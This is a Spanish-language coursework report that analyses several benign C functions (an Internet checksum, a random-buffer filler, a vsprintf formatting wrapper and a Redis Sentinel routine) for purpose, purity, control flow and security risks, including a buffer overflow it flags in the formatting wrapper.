<li>Exporta: No. La palabra clave <code>static</code> al inicio de la declaración restringe la visibilidad de esta función únicamente al archivo fuente (<code>.c</code>) actual. No es visible para otros módulos.</li>
</ul>
<h3 id="9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-2"><strong>9. Ejecución y depuración de la Función 2</strong></h3>
<ul>
<li>Usa solo el runtime mínimo de C, la operación aritmética.</li>
<li>Mecanismo de carga: Al ser estática, su dirección se resuelve en tiempo de compilación/enlace dentro de su propia unidad de traducción.</li>
</ul>
<h3 id="10-estructuras-de-control-de-la-funci%C3%B3n-2"><strong>10. Estructuras de control de la Función 2</strong></h3>
<ul>
<li>No hay estructuras de control (<code>if</code>, <code>for</code>, etc.).</li>
<li><strong>Es un bloque lineal</strong> simple que ejecuta una instrucción y retorna.</li>
<li>Usa <code>return</code> para finalizar.</li>
</ul>
<h3 id="11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-2"><strong>11. Análisis de malware / seguridad de la Función 2</strong></h3>
<p>Desde la óptica de malware, esta función:</p>
<ul>
<li>Solo lee un campo de dos estructuras y devuelve una resta.</li>
<li>No accede a red, disco, procesos, registro, ni memoria dinámica.</li>
<li>No hace ofuscación, ni anti-debug, ni nada similar.</li>
<li>Segura en memoria: No realiza aritmética de punteros peligrosa ni escribe en memoria.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h2 id="funci%C3%B3n-3"><strong>Función 3</strong></h2>
<p><img src="capturas/funcion-3.png" alt="funcion-3"></p>
<pre class="hljs"><code><div>uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count &gt; 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum &gt;&gt; 16) + (sum &amp; 0xFFFF);
    sum += (sum &gt;&gt; 16);

    return ~sum;
}
</div></code></pre>
<h3 id="1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-3"><strong>1. Identificación y propósito de la Función 3</strong></h3>
<ul>
<li><strong>Nombre:</strong> <code>checksum_generic</code></li>
<li><strong>Contexto:</strong> Algoritmo de verificación de integridad, Checksum.</li>
<li><strong>¿Qué hace?:</strong> Implementa el cálculo del Checksum de Internet (<code>RFC 1071</code>), estándar en protocolos como IP, TCP y UDP. Recorre un bloque de memoria apuntado por addr, suma palabras de 16 bits en una variable de mayor tamaño (<code>unsigned long</code>), maneja el posible byte sobrante y finalmente pliega la suma a 16 bits y le hace el complemento a uno. Devuelve ese checksum de 16 bits.</li>
</ul>
<h3 id="2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-3"><strong>2. Naturaleza de la función de la Función 3</strong></h3>
<ul>
<li><strong>Clasificación:</strong> Es función, devuelve un valor numérico explícito (<code>uint16_t</code>).</li>
<li><strong>Origen:</strong> Función de usuario.</li>
<li><strong>¿Predicado?:</strong> No, devuelve un valor numérico de checksum, no un booleano.</li>
<li><strong>¿Función hoja?:</strong> Sí. No realiza llamadas a otras funciones.</li>
</ul>
<h3 id="3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-3"><strong>3. Signatura y parámetros de la Función 3</strong></h3>
<ul>
<li>
<p><strong>Signatura:</strong> <code>uint16_t checksum_generic(uint16_t *addr, uint32_t count);</code></p>
</li>
<li>
<p><strong>Aridad:</strong> 2 parámetros → función binaria.</p>
</li>
<li>
<p><strong>Parámetros:</strong></p>
<ul>
<li>
<p><code>addr</code>:</p>
<ul>
<li>Tipo: <code>uint16_t *</code>. Puntero a enteros sin signo de 16 bits (el buffer de datos).</li>
<li>Paso: Se pasa por valor, la dirección de memoria, actuando como referencia al buffer.</li>
<li>No está declarado como <code>const</code>, aunque no se modifica la memoria apuntada.</li>
</ul>
</li>
<li>
<p><code>count</code>:</p>
<ul>
<li>Tipo: <code>uint32_t</code>. Entero sin signo de 32 bits, que es la cantidad de bytes a procesar.</li>
<li>Paso: Por valor.</li>
<li>Se utiliza como contador de longitud: en el bucle for se va decrementando (<code>count -= 2</code>). Esta modificación sólo afecta al valor local dentro de la función.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Parámetros constantes:</strong> No. Ninguno está declarado <code>const</code>, aunque semánticamente se usan como entrada solo.</p>
</li>
<li>
<p><strong>Parámetros por defecto:</strong> No tiene.</p>
</li>
<li>
<p><strong>Varargs:</strong> No hay parámetros Variables.</p>
</li>
</ul>
<h3 id="4-valor-de-retorno-de-la-funci%C3%B3n-3"><strong>4. Valor de retorno de la Función 3</strong></h3>
<ul>
<li><strong>Tipo devuelto:</strong> <code>uint16_t</code>. Entero sin signo de 16 bits.</li>
<li><strong>Devuelve:</strong> El valor del checksum calculado.</li>
<li><strong>¿Devuelve un objeto creado dentro de ella?:</strong> No, devuelve un valor primitivo.</li>
</ul>
<h3 id="5-comportamiento-y-efectos-secundarios-de-la-funci%C3%B3n-3"><strong>5. Comportamiento y Efectos secundarios de la Función 3</strong></h3>
<ul>
<li><strong>Efectos Secundarios:</strong> Ninguno.</li>
<li><strong>Lectura de Memoria:</strong> Solo lee el rango especificado por addr.</li>
<li><strong>Mutación:</strong> Solo muta sus propias variables locales (sum<code>, copias locales de </code>addr<code>y</code>count`).</li>
<li><strong>Conclusión: no tiene efectos secundarios observables.</strong></li>
</ul>
<h3 id="6-pureza-y-estado-de-la-funci%C3%B3n-3"><strong>6. Pureza y Estado de la Función 3</strong></h3>
<ul>
<li><strong>¿Es pura?:</strong> Sí. No modifica estado global ni parámetros. Sólo lee la memoria a la que apuntan sus parámetros. Si el contenido de la memoria no cambia, siempre devuelve lo mismo → se puede considerar función pura, a efectos prácticos de análisis de código.</li>
<li>Transparencia referencial: Sí.</li>
</ul>
<h3 id="7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-3"><strong>7. Sistema de tipos y visibilidad de la Función 3</strong></h3>
<ul>
<li><strong>Lenguaje:</strong> C → tipado estático.</li>
<li><strong>Tipos Clave:</strong> <code>uint16_t</code> (datos), <code>uint32_t</code> (contador), <code>unsigned long</code> (acumulador).</li>
<li><strong>Enlace (Linkage):</strong> Enlace estático o dinámico dependiendo de cómo se compile el archivo <code>objet</code>.</li>
</ul>
<h3 id="8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-3"><strong>8. Relaciones con otras funciones y librerías de la Función 3</strong></h3>
<ul>
<li>No llama a ninguna otra función.</li>
<li><strong>Exporta:</strong> Sí.</li>
</ul>
<h3 id="9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-3"><strong>9. Ejecución y depuración de la Función 3</strong></h3>
<ul>
<li>Usa solo el runtime básico de C, operaciones aritméticas y de desplazamiento.</li>
<li>Si el binario se compila con símbolos de depuración, aparecerá con el nombre <code>checksum_generic</code>, pero esto depende de las opciones de compilación, no del código fuente.</li>
</ul>
<h3 id="10-estructuras-de-control-de-la-funci%C3%B3n-3"><strong>10. Estructuras de control de la Función 3</strong></h3>
<ul>
<li>
<p><strong>Bifurcación:</strong></p>
<ul>
<li>Un <code>if (count == 1)</code> para tratar el caso en que queda un byte sobrante.</li>
</ul>
</li>
<li>
<p><strong>Repetición:</strong></p>
<ul>
<li>Bucle <code>for (sum = 0; count &gt; 1; count -= 2)</code>. Lee de dos en dos bytes (una palabra de 16 bits) mientras queden al menos 2 bytes.</li>
</ul>
</li>
<li>
<p><strong>Saltos / flujo:</strong></p>
<ul>
<li>Solo un return al final <code>(return ~sum;)</code>.</li>
<li>No hay <code>break</code>, <code>continue</code>, <code>goto</code>, ni excepciones.</li>
</ul>
</li>
</ul>
<h3 id="11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-3"><strong>11. Análisis de malware / seguridad de la Función 3</strong></h3>
<ul>
<li>Este tipo de función puede aparecer tanto en software legítimo (protocolos de red, verificación de integridad) como en malware (para validar payloads, comprobar integridad de código, etc.).</li>
<li>Por sí sola no es indicador de comportamiento malicioso.</li>
<li>Conclusión en clave malware: Es una rutina de checksum genérica, muy neutra. El posible uso malicioso dependería de qué datos se le pasan y desde dónde se llama, no de la función en sí.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h2 id="funci%C3%B3n-4"><strong>Función 4</strong></h2>
<p><img src="capturas/funcion-4.png" alt="funcion-4"></p>
<pre class="hljs"><code><div>void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    while (len &gt; 0)
    {
        if (len &gt;= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len &gt;= 2)
        {
            *((uint16_t *)str) = rand_next() &amp; 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else
        {
            *str++ = rand_next() &amp; 0xFF;
            len--;
        }
    }
}
</div></code></pre>
<h3 id="1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-4"><strong>1. Identificación y propósito de la Función 4</strong></h3>
<ul>
<li><strong>Nombre:</strong> <code>rand_str</code>.</li>
<li><strong>Contexto:</strong> Rutina de llenado de memoria con datos pseudo-aleatorios (Memory Fill / Random Generator).</li>
<li><strong>Descripción:</strong> Rellena un búfer apuntado por <code>str</code> con len bytes de datos aleatorios.
<ul>
<li>Estrategia de Optimización: En lugar de escribir byte a byte, intenta escribir bloques de palabra de 32 bits (4 bytes) y media palabra (2 bytes) para reducir el número de accesos a memoria.</li>
</ul>
</li>
<li><strong>Nota Importante:</strong> El comentario <code>not alphanumeric!</code> confirma que genera datos binarios crudos, no texto legible. Los bytes pueden tener cualquier valor entre <code>0x00</code> y <code>0xFF</code>.</li>
</ul>
<h3 id="2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-4"><strong>2. Naturaleza de la función de la Función 4</strong></h3>
<ul>
<li><strong>Clasificación:</strong> Es un procedimiento. Retorna <code>void</code>.</li>
<li><strong>Origen:</strong> Código de usuario.</li>
<li><strong>Nivel:</strong> Bajo nivel, hace una manipulación directa de punteros y memoria.</li>
<li><strong>¿Predicado?:</strong> No. Retorna <code>void</code>. Un predicado suele devolver un booleano (verdadero/falso) evaluando una condición lógica.</li>
<li><strong>¿Función Hoja?:</strong> No. Depende de <code>rand_next()</code>. No es leaf function en el árbol de llamadas.</li>
</ul>
<h3 id="3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-4"><strong>3. Signatura y parámetros de la Función 4</strong></h3>
<ul>
<li>
<p><strong>Signatura:</strong> <code>void rand_str(char *str, int len);</code></p>
</li>
<li>
<p><strong>Aridad:</strong> 2 parámetros → función binaria.</p>
</li>
<li>
<p><strong>Parámetros:</strong></p>
<ul>
<li><code>str</code> (Entrada/Salida): char *.
<ul>
<li>Puntero al inicio del bloque de memoria a llenar. Paso por valor.</li>
<li>No es <code>const</code>. Explícitamente se usa para escritura.</li>
<li>Riesgo de Alineación: Al hacer <code>cast</code> a <code>uint32_t *</code>, si la dirección de <code>str</code> no es múltiplo de 4, podría provocar un fallo de segmentación (<code>Bus Error</code>), aunque <code>x86</code> lo tolera con penalización de rendimiento.</li>
</ul>
</li>
<li><code>len</code> (Entrada): <code>int</code>.
<ul>
<li>Entero que indica la longitud, que es la cantidad de bytes a escribir. Paso por valor.</li>
<li>Se usa como contador de bytes restantes; se va decrementando en el <code>while</code>.</li>
<li>Longitud en bytes. Se modifica localmente, decrementándose para controlar el bucle.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Parámetros <code>const</code>:</strong> No.</p>
</li>
<li>
<p><strong>Valores por defecto:</strong> No.</p>
</li>
<li>
<p><strong>No es varargs.</strong> No acepta un número variable de argumentos.</p>
</li>
</ul>
<h3 id="4-valor-de-retorno-de-la-funci%C3%B3n-4"><strong>4. Valor de retorno de la Función 4</strong></h3>
<ul>
<li><strong>Tipo devuelto:</strong> <code>void</code>.</li>
<li><strong>Qué “devuelve” en la práctica:</strong> No hay valor de retorno; el “resultado” es el contenido del búfer <code>str</code>, que queda rellenado con valores pseudo-aleatorios.</li>
<li><strong>Resultado:</strong> La función opera exclusivamente mediante efectos secundarios, mutación del búfer.</li>
</ul>
<h3 id="5-comportamiento-y-efectos-secundarios-de-la-funci%C3%B3n-4"><strong>5. Comportamiento y Efectos secundarios de la Función 4</strong></h3>
<ul>
<li><strong>Muta o lee valores fuera de su ámbito:</strong> Muta valores en el <code>heap</code> o <code>stack</code> (el búfer <code>str</code>) que pertenece al ámbito del llamador ⇒ Tiene efectos secundarios claros, no es pura.</li>
<li><strong>Mutación de Memoria:</strong> Escribe directamente en el <code>heap</code> o <code>stack</code> del llamador.</li>
<li><strong>Llamadas:</strong> Invoca repetidamente a <code>rand_next()</code> para obtener entropía.</li>
<li><strong>Estado Global:</strong> Modifica implícitamente el estado del generador de números aleatorios.</li>
</ul>
<h3 id="6-pureza-y-estado-de-la-funci%C3%B3n-4"><strong>6. Pureza y Estado de la Función 4</strong></h3>
<ul>
<li><strong>¿Es pura?:</strong> No.
<ul>
<li>Depende de un generador externo, <code>rand_next</code>.</li>
<li>Muta la memoria externa, <code>str</code>.</li>
<li>No es determinista.</li>
</ul>
</li>
<li><strong>Transparencia Referencial:</strong> No.</li>
</ul>
<h3 id="7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-4"><strong>7. Sistema de tipos y Visibilidad de la Función 4</strong></h3>
<ul>
<li><strong>Lenguaje:</strong> C (Tipado estático pero con punteros &quot;débiles&quot;).</li>
<li><strong>Casting (Type Punning):</strong> La función realiza conversiones de tipo explícitas y arriesgadas: convierte un puntero <code>char*</code> a <code>uint32_t*</code> y <code>uint16_t*</code>.
<ul>
<li>Esto indica que el compilador debe tratar la misma dirección de memoria como diferentes tipos de datos para optimizar la escritura.</li>
</ul>
</li>
<li><strong>Enlace (Linkage):</strong> Externo.
<ul>
<li>Al no tener la palabra clave <code>static</code>, la función es exportada y visible para cualquier otro archivo del proyecto que la enlace.</li>
</ul>
</li>
</ul>
<h3 id="8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-4"><strong>8. Relaciones con otras funciones y librerías de la Función 4</strong></h3>
<ul>
<li>Llama a: <code>rand_next()</code>: generador de números pseudo-aleatorios.</li>
<li>No se ven otras dependencias directas, no hace llamadas de sistema, ni I/O, etc..</li>
</ul>
<h3 id="9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-4"><strong>9. Ejecución y depuración de la Función 4</strong></h3>
<ul>
<li>Requiere el runtime del generador de PRNG (<code>rand_next()</code>), pero por lo demás, solo operaciones aritméticas / de punteros.</li>
<li>No hay información en el código fuente sobre símbolos de depuración; eso depende de cómo se compile.</li>
</ul>
<h3 id="10-estructuras-de-control-de-la-funci%C3%B3n-4"><strong>10. Estructuras de control de la Función 4</strong></h3>
<ul>
<li>
<p><strong>Repetición:</strong> Un bucle <code>while (len &gt; 0)</code> que va consumiendo longitud.</p>
</li>
<li>
<p><strong>Bifurcación:</strong></p>
<ul>
<li>Dentro del<code> while</code>, un <code>if / else if / else</code>:
<ul>
<li><code>len &gt;= 4</code> → escribe 4 bytes de golpe (cast a <code>uint32_t *</code>).</li>
<li><code>len &gt;= 2</code> → escribe 2 bytes (<code>uint16_t *</code>).</li>
<li>Si no, escribe 1 byte.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Saltos / flujo:</strong></p>
<ul>
<li>No hay <code>break</code>, <code>continue</code>, <code>goto</code>.</li>
<li>El bucle termina cuando <code>len</code> llega a <code>0</code>.</li>
</ul>
</li>
</ul>
<h3 id="11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-4"><strong>11. Análisis de malware / seguridad de la Función 4</strong></h3>
<ul>
<li><strong>Riesgo Técnico:</strong> Problema de alineación de punteros.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h2 id="funci%C3%B3n-5"><strong>Función 5</strong></h2>
<p><img src="capturas/funcion-5.png" alt="funcion-5"></p>
<pre class="hljs"><code><div>static const char *TextFormat(const char *text, ...)
{
    #define MAX_FORMATTEXT_LENGTH   64

    static char buffer[MAX_FORMATTEXT_LENGTH];

    va_list args;
    va_start(args, text);
    vsprintf(buffer, text, args);
    va_end(args);

    return buffer;
}
</div></code></pre>
<h3 id="1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-5"><strong>1. Identificación y Propósito de la Función 5</strong></h3>
<ul>
<li><strong>Nombre:</strong> <code>TextFormat</code>.</li>
<li><strong>Contexto:</strong> Función envoltorio (wrapper) para formateo de cadenas en C.</li>
<li><strong>Descripción:</strong> Utilidad para formatear texto con argumentos variables (similar a <code>printf</code>) y devolverlo como una cadena utilizable.
<ul>
<li>Toma una cadena de formato (<code>text</code>) y argumentos variables (<code>...</code>).</li>
<li>Procesa los argumentos usando <code>vsprintf</code>.</li>
<li>Almacena el resultado en un búfer estático interno (<code>buffer</code>).</li>
<li>Devuelve un puntero a dicho búfer.</li>
</ul>
</li>
<li><strong>Nota Crítica:</strong> Debido al uso de un <code>static char buffer</code>, el contenido devuelto es volátil: se sobrescribirá en la siguiente llamada a la función. No es persistente más allá de la siguiente invocación.</li>
</ul>
<h3 id="2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-5"><strong>2. Naturaleza de la función de la Función 5</strong></h3>
<ul>
<li><strong>Clasificación:</strong> Es una función (devuelve un valor explícito <code>const char *</code>).</li>
<li><strong>Origen:</strong> Función de usuario.</li>
<li><strong>¿Es Predicado?:</strong> No. Devuelve un puntero a caracteres constantes. Un predicado suele devolver un booleano (verdadero/falso) evaluando una condición lógica.</li>
<li><strong>¿Es Función Hoja?: No.</strong> Realiza llamadas a la biblioteca estándar (<code>va_start</code>, <code>vsprintf</code>, <code>va_end</code>).</li>
<li><strong>¿Parámetros Variables?:</strong> Sí. Es una función variádica. En la definición de la función usa <code>...</code> que indica que después de los parámetros fijos, la función puede recibir un número variable de argumentos.</li>
</ul>
<h3 id="3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-5"><strong>3. Signatura y parámetros de la Función 5</strong></h3>
<ul>
<li>
<p><strong>Signatura:</strong> <code>static const char *TextFormat(const char *text, ...);</code></p>
</li>
<li>
<p><strong>Aridad:</strong> función de aridad variable (varargs):</p>
<ul>
<li>Al menos 1 parámetro fijo (<code>text</code>).</li>
<li>Luego <code>...</code> Es la lista de argumentos variables.</li>
</ul>
</li>
<li>
<p><strong>Parámetros por defecto:</strong> No.</p>
</li>
<li>
<p><strong>Parámetros:</strong></p>
<ul>
<li><code>text</code> (Fijo): <code>const char *</code>. Cadena de formato. Pasado por valor (el puntero), de solo lectura.</li>
<li><code>...</code> (Variables): Lista de argumentos gestionada mediante macros de <code>stdarg.h</code>. Se pasan a través de la pila (<code>stack</code>).</li>
</ul>
</li>
</ul>
<h3 id="4-valor-de-retorno-de-la-funci%C3%B3n-5"><strong>4. Valor de retorno de la Función 5</strong></h3>
<ul>
<li><strong>Tipo:</strong> <code>const char *</code>. Puntero a caracteres constantes.</li>
<li><strong>Valor:</strong> La dirección de memoria del array estático <code>buffer</code>.</li>
<li><strong>Semántica:</strong> Devuelve una referencia a una zona de memoria compartida y mutable internamente.</li>
</ul>
<h3 id="5-comportamiento-y-efectos-de-la-funci%C3%B3n-5"><strong>5. Comportamiento y Efectos de la Función 5</strong></h3>
<ul>
<li><strong>Modificación de Estado:</strong> Sí. Modifica la variable estática `buffer****.
<ul>
<li>Aunque <code>buffer</code> está declarada dentro de la función, su almacenamiento es estático, vive durante toda la ejecución del programa y mantiene su valor entre llamadas hasta que es sobrescrito.</li>
</ul>
</li>
<li><strong>Modificación de Globales:</strong> Técnicamente modifica una variable con almacenamiento estático, que actúa funcionalmente como una variable global privada, con visibilidad restringida al ámbito de la función.</li>
<li><strong>Llamadas:</strong> Invoca a <code>vsprintf</code>, con efectos secundarios de escritura en memoria.</li>
</ul>
<h3 id="6-pureza-y-estado-de-la-funci%C3%B3n-5"><strong>6. Pureza y Estado de la Función 5</strong></h3>
<ul>
<li>
<p><strong>¿Función Pura?:</strong> No.</p>
<ul>
<li>Depende de estado mutable (<code>buffer</code>).</li>
<li>No tiene transparencia referencial.</li>
</ul>
</li>
<li>
<p><strong>Seguridad de Hilos:</strong> No.</p>
<ul>
<li>No es reentrante. Si dos hilos llaman a <code>TextForma</code> simultáneamente, se producirá una condición de carrera (race condition) corrompiendo el contenido del <code>buffer</code>.</li>
</ul>
</li>
</ul>
<h3 id="7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-5"><strong>7. Sistema de Tipos y Visibilidad de la Función 5</strong></h3>
<ul>
<li><strong>Sistema de Tipos:</strong> Estático (C).</li>
<li><strong>Ámbito (Scope):</strong> De archivo / Módulo.</li>
<li><strong>Enlace (Linkage):</strong> Interno.
<ul>
<li>La palabra clave <code>static</code> en la declaración de la función (<code>static const char *...</code>) impide que esta función sea visible o enlazada desde otros archivos objeto (<code>.o</code>). Es privada para este módulo.</li>
</ul>
</li>
</ul>
<h3 id="8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-5"><strong>8. Relaciones con otras funciones y librerías de la Función 5</strong></h3>
<ul>
<li>Llama a:
<ul>
<li><code>va_start</code>, <code>va_end</code> (macros/funciones de <code>&lt;stdarg.h&gt;</code>).</li>
<li><code>vsprintf</code> (función de la libc para formatear en un <code>buffer</code> con <code>va_list</code>).</li>
</ul>
</li>
</ul>
<h3 id="9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-5"><strong>9. Ejecución y depuración de la Función 5</strong></h3>
<ul>
<li>Usa el runtime estándar de C (libc).</li>
<li>Depuración normal; al ser <code>static</code>, su símbolo es interno al módulo.</li>
</ul>
<h3 id="10-estructuras-de-control-de-la-funci%C3%B3n-5"><strong>10. Estructuras de control de la Función 5</strong></h3>
<ul>
<li>No tiene bucles ni condicionales.</li>
<li><strong>Flujo lineal:</strong>
<ul>
<li>Preparar <code>va_list</code>.</li>
<li>Llamar a <code>vsprintf</code>.</li>
<li>Cerrar <code>va_list</code>.</li>
<li><code>return buffer;</code>.</li>
</ul>
</li>
</ul>
<h3 id="11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-5"><strong>11. Análisis de malware / seguridad de la Función 5</strong></h3>
<ul>
<li><strong><mark>Vulnerabilidad Crítica (Buffer Overflow):<mark></strong>
<ul>
<li>Uso de <code>vsprintf</code> (en lugar de <code>vsnprintf</code>) en un búfer de tamaño fijo muy pequeño (<code>MAX_FORMATTEXT_LENGTH = 64 bytes</code>) → riesgo de desbordamiento de <code>buffer</code> si el resultado supera <code>MAX_FORMATTEXT_LENGTH</code>.</li>
<li>Si el texto formateado excede los 63 caracteres (+ terminador nulo), <code>vsprintf</code> escribirá fuera de los límites del array <code>buffer</code>, corrompiendo la memoria adyacente: el stack o sección de datos estáticos, dependiendo del compilador.</li>
</ul>
</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h1 id="ejercicio-3---an%C3%A1lisis-de-variables"><strong>Ejercicio 3 - Análisis de variables</strong></h1>
<p>Una función representa un punto de entrada, posiblemente con parámetros, que puede necesitar acceder a variables globales, que puede manipular ciertas variables y que, finalmente, retorna o no un resultado. En más, puede retornar no solo en un punto sino en varios, dado que también puede tomar decisiones mediante las estructuras de control que hemos estudiado.</p>
<p>Tenemos el código de una función y vamos a analizarla. Necesitamos señalar:</p>
<ul>
<li>Donde y que variables crea y necesita; cual es su ámbito.</li>
<li>Donde modifica (escribe) los parámetros.</li>
<li>Donde lee o modifica valores globales (fuera de la función o sus parámetros)</li>
<li>Que estructuras de control posee. Debemos identificar los bucles (while, for, …), estructuras
selectivas (if, switch, …).</li>
<li>Que puntos de salida posee y con que valor lo hacen.</li>
</ul>
<pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sentinelPropagateDownAfterPeriod</span><span class="hljs-params">(sentinelRedisInstance *master)</span> </span>{
    dictIterator *di;
    dictEntry *de;
    <span class="hljs-keyword">int</span> j;
    dict *d[] = {master-&gt;slaves, master-&gt;sentinels, <span class="hljs-literal">NULL</span>};
 
    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; d[j]; j++) {
        di = dictGetIterator(d[j]);
        <span class="hljs-keyword">while</span>((de = dictNext(di)) != <span class="hljs-literal">NULL</span>) {
            sentinelRedisInstance *ri = dictGetVal(de);
            ri-&gt;down_after_period = master-&gt;down_after_period;
        }
        dictReleaseIterator(di);
    }
}
</div></code></pre>
<h2 id="1-par%C3%A1metros-y-retorno"><strong>1. Parámetros y retorno</strong></h2>
<ul>
<li>La función se llama <code>sentinelPropagateDownAfterPeriod</code>.</li>
<li>Retorno: <code>void</code> → no devuelve ningún valor.</li>
<li>Parámetro único (1): Toma un solo parámetro de tipo puntero a <code>sentinelRedisInstance</code> llamado <code>master</code>. Este parámetro se usa para leer valores iniciales y para propagar su configuración a otros objetos.</li>
</ul>
<h2 id="2-variables-locales-que-crea-y-necesita-%C3%A1mbito-de-esas-variables"><strong>2. Variables locales que crea y necesita; ámbito de esas variables.</strong></h2>
<p>Dentro de la función se crean variables locales (su ámbito es todo el cuerpo de la función, salvo donde se indique):</p>
<ul>
<li>(2) <code>dictIterator *di;</code> Puntero a un iterador de diccionario. Se usa para recorrer los diccionarios de <code>esclavos</code> y <code>sentinels</code>.</li>
<li>(3) <code>dictEntry *de;</code> Puntero a una entrada de diccionario, usada en el <code>while</code>.</li>
<li>(4) <code>int j;</code> Entero usado como índice en el bucle for sobre el <code>array d</code>.</li>
<li>(5) <code>dict *d[] = {master-&gt;slaves, master-&gt;sentinels, NULL};</code> Array local de punteros a <code>dict</code>.
<ul>
<li><code>d[0]</code> apunta al diccionario de esclavos (<code>master-&gt;slaves</code>).</li>
<li><code>d[1]</code> apunta al diccionario de sentinels (<code>master-&gt;sentinels</code>).</li>
<li><code>d[2]</code> es <code>NULL</code> y actúa como marcador de final para el bucle <code>for</code>.</li>
</ul>
</li>
</ul>
<p>Dentro del bucle while se crea otra variable local, cuyo ámbito se limita al cuerpo del <code>while</code>:</p>
<ul>
<li>(6) <code>sentinelRedisInstance *ri = dictGetVal(de);</code> Puntero a sentinelRedisInstance, representa cada <code>esclavo o sentinel</code> extraído del diccionario actual.</li>
</ul>
<h2 id="3-uso-y-modificaci%C3%B3n-de-par%C3%A1metros"><strong>3. Uso y modificación de parámetros</strong></h2>
<ul>
<li>El parámetro <code>master</code> no se modifica, no se le asigna un nuevo valor ni se cambia su dirección.</li>
<li>Sí se leen varios campos de <code>master</code>:
<ul>
<li>
<p>En la inicialización del <code>array d</code> (línea 5):</p>
<ul>
<li><code>master-&gt;slaves</code></li>
<li><code>master-&gt;sentinels</code></li>
</ul>
</li>
<li>
<p>En el interior del <code>while</code> (línea 11):</p>
<ul>
<li><code>master-&gt;down_after_period</code> se usa como fuente del valor que se va a propagar.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Por tanto:</p>
<ul>
<li><code>master</code> se usa como origen de información, nunca como destino de escritura directa.</li>
</ul>
<h2 id="4-lectura---escritura-de-valores-globales"><strong>4. Lectura - Escritura de valores globales</strong></h2>
<p>Aunque no vemos variables globales explícitas, sí se modifican estructuras que no son locales a la función:</p>
<ul>
<li>En la línea 11:
<ul>
<li><code>ri-&gt;down_after_period = master-&gt;down_after_period;</code></li>
<li>Se lee <code>master-&gt;down_after_period</code>, dato asociado al maestro.</li>
<li>Se escribe en <code>ri-&gt;down_after_period</code>. <code>ri</code> apunta a instancias obtenidas de los diccionarios <code>master-&gt;slaves</code> y <code>master-&gt;sentinels</code>, por lo que la función está modificando el campo <code>down_after_period</code> de todas esas instancias (<code>esclavos y sentinels</code>) accesibles a través del parámetro <code>master</code>.</li>
</ul>
</li>
</ul>
<p>Es decir, la función propaga el valor <code>down_after_period</code> del maestro al resto de instancias relacionadas.</p>
<ul>
<li>Modificación de memoria. Efecto lateral:
<ul>
<li>En la línea 10, modifica el objeto apuntado por <code>ri</code>.</li>
<li>Escribe en <code>ri-&gt;down_after_period</code> el valor leído del parámetro <code>master-&gt;down_after_period</code>. Aquí es donde ocurre la &quot;propagación&quot; del valor.</li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h2 id="5-estructuras-de-control"><strong>5. Estructuras de control</strong></h2>
<ul>
<li>
<p><strong>Bucle for (líneas 7–14):</strong></p>
<pre class="hljs"><code><div><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; d[j]; j++) {
  ...
}
</div></code></pre>
<ul>
<li>Inicialización: <code>j = 0</code>.</li>
<li>Condición: <code>d[j]</code> → el bucle continúa mientras el elemento actual del <code>array d</code> no sea <code>NULL</code>.</li>
<li>Actualización: <code>j++</code> en cada iteración.</li>
<li>Efecto: recorre los dos diccionarios, slaves y sentinels, definidos en el <code>array d</code>. El <code>NULL</code> final actúa de condición de parada.</li>
</ul>
</li>
<li>
<p><strong>Bucle while (líneas 9–12):</strong></p>
<pre class="hljs"><code><div><span class="hljs-keyword">while</span>((de = dictNext(di)) != <span class="hljs-literal">NULL</span>) {
  ...
}
</div></code></pre>
<ul>
<li>Condición: el resultado de <code>dictNext(di)</code> se asigna a <code>de</code> y se compara con <code>NULL</code>.</li>
<li>La iteración continúa mientras <code>dictNext</code> devuelva una entrada válida de diccionario (<code>de != NULL</code>).</li>
<li>Efecto: recorre todas las entradas del diccionario actual <code>d[j]</code>.</li>
</ul>
</li>
<li>
<p><strong>No hay estructuras selectivas</strong> tipo <code>if</code>, <code>switch</code> en este fragmento.</p>
</li>
</ul>
